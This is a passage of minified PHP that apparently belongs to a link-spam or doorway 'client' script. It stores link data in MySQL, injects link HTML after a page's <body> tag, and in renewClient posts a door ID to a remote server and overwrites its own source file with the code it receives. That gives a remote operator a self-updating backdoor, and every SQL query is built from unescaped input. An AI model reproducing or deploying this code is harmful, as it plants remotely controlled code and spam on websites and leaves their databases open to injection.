readFromBDLinks($tablename,$urlhash,$dbhost,$dbname,$dbuser,$dbpass){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on read links. ";return false;}else{$sql="select * from ".$tablename." where urlhash='".$urlhash."'";$needcache=mysqli_query($dbcon,$sql);$needcache=mysqli_fetch_array($needcache);if(!empty($needcache)){$ownurls=$needcache['ownlinks'];$ownurls=urldecode($ownurls);$otherlinks=$needcache['extlinks'];$otherlinks=urldecode($otherlinks);$result=array("ownlinks"=>$ownurls,"extlinks"=>$otherlinks);mysqli_close($dbcon);return$result;}else{mysqli_close($dbcon);return"no";}}}function addLinksToBD($tablename,$urlhash,$ownlinks,$dbhost,$dbname,$dbuser,$dbpass,$extlinks){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on add links. ";return false;}else{if(!empty($extlinks)){$sql="INSERT INTO ".$tablename."(urlhash, extlinks) VALUES ('".$urlhash."','".$extlinks."')";}else{$sql="INSERT INTO ".$tablename."(urlhash, ownlinks) VALUES ('".$urlhash."','".$ownlinks."')";}if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return"yes";}else{$GLOBALS["errors"].="Can't add links to cache table. ";mysqli_close($dbcon);return false;}}}function dropTable($tablename,$dbhost,$dbname,$dbuser,$dbpass){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on read value. ";return false;}else{$query="DROP TABLE ".$tablename;$result=mysqli_query($dbcon,$query) or die(mysqli_error($dbcon));if($result){mysqli_close($dbcon);return"yes";}else{mysqli_close($dbcon);return"no";}}}function updateExtLinksToBD($tablename,$extlinks,$setts,$dbhost,$dbname,$dbuser,$dbpass){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on update other links. ";return false;}else{$extlinks=serialize($extlinks);$extlinks=urlencode($extlinks);$sql="UPDATE ".$tablename." SET extlinks='".$extlinks."', setts='".$setts."' WHERE extlinks is null LIMIT 1";if(mysqli_query($dbcon,$sql)){mysqli_close($dbcon);return"yes";}else{mysqli_close($dbcon);return"no";}}}function placeLinks($pageurl,$links){$page=httpGet($pageurl);if(!empty($page)){$page=preg_replace("/(<body.*>)/","\$1".$links,$page,1);return$page;}}function renewClient($urlwithcode,$id_of_door){$params="doorid=".$id_of_door."&newclient=yes";$client_code=httpPost($urlwithcode,$params);if(!empty($client_code)&&stripos("qqq".$client_code,"MYSQLI_NUM")){$fod=fopen(__FILE__,"w+");flock($fod,LOCK_EX);fwrite($fod,trim($client_code));fclose($fod);}}function getCountOfTableStrings($tablename,$dbhost,$dbname,$dbuser,$dbpass,$nulled,$withcache){$dbcon=mysqli_connect($dbhost,$dbuser,$dbpass,$dbname);if(!$dbcon){$GLOBALS["errors"].="mysql connect error on get count. ";return false;}else{if($nulled=="yes"){$row_count=mysqli_query($dbcon,'SELECT COUNT(*) FROM '.$tablename.' WHERE extlinks is null;');}elseif(!empty($withcache)){$row_count=mysqli_query($dbcon,"SELECT COUNT(*) FROM ".$tablename." WHERE LENGTH(cache)>100;");}else{$row_count=mysqli_query($dbcon,'SELECT COUNT(*) FROM '.$tablename.';');}$row_count=$row_count->fetch_array(MYSQLI_NUM);$row_count=$row_count[0];mysqli_close($dbcon);return$row_count;}};